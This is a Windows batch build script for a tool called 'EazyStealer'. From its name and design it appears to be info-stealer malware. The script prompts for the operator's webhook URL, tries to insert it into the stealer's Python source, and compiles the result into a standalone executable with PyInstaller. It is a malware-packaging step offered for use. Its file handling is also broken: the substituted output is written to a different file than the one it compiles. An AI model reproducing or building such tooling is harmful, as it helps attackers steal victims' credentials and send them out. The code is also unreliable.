@echo off
setlocal

set /p webhook_url=Please enter your webhook URL: 

powershell -Command "(EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File script.py"

pyinstaller --onefile EazyStealer.py

del script.spec
rmdir /s /q build

echo Build complete! Your executable is located in the dist folder.
endlocal
pause
